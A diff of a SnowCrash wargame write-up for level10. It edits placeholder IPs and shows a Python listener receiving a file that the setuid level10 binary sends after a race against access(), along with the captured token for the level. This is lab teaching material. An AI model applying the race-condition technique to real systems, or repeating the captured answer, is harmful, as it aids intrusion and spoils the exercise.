@@ -21,12 +21,13 @@ On the man page of access we can read :
 So we will do just that to access token.
 
 But we have to first write a little program to create a server on port 6969 to get the content of token.
+Level to do inside the vm without ssh connection. In NAT.
 ********************************************************************************
 
 import socket
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-addr = ("ip", 6969)
+addr = ("ip mac", 6969)
 server.bind(addr)
 server.listen(5)
 print("addr = %s, port = %s" % addr)
@@ -62,13 +63,13 @@ The & permit us to keep this process in the background.
 ********************************************************************************
 
 level10@SnowCrash:~$ ./level10 /tmp/falsegod [ip]
-Connecting to [ip]:6969 .. Connected!
+Connecting to [ip mac]:6969 .. Connected!
 Sending file .. wrote file!
 
 ➜  42Projects python3 httpserver.py
-addr = [ip], port = 6969
+addr = [ip mac], port = 6969
 En attente...
-Connexion de  (‘[ip]’, 52971)
+Connexion de  (‘[ip mac]’, 52971)
 recu: "b'.*( )*.\n'"
 recu: "b'woupa2yuojeeaaed06riuj63c\n'"
 recu: "b''"
